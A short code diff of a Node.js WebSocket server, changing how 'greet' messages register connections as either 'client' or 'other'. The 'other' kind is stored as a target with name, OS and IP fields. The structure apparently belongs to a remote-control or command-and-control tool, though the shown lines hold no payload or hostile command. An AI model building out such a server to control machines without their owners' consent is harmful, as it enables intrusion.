@@ -47,7 +47,7 @@ wss.on('connection', (ws) =>
     }
 
     if (command.name !== 'greet') return;
-    if (command.args.length === 0) {
+    if (command.data?.t === 'client') {
       const client = new Socket(ws);
 
       clients.push(client);
@@ -55,11 +55,11 @@ wss.on('connection', (ws) =>
       ws.on('close', () => clients.splice(clients.indexOf(client), 1));
 
       console.log(`New client: ${client.id}`);
-    } else if (command.args.length === 3) {
+    } else if (command.data?.t === 'other') {
       const target = new Target(ws, {
-        name: command.args[0],
-        os: command.args[1],
-        ip: command.args[2],
+        name: command.data?.name,
+        os: command.data?.os,
+        ip: command.data?.ip,
       });
 
       targets.push(target);
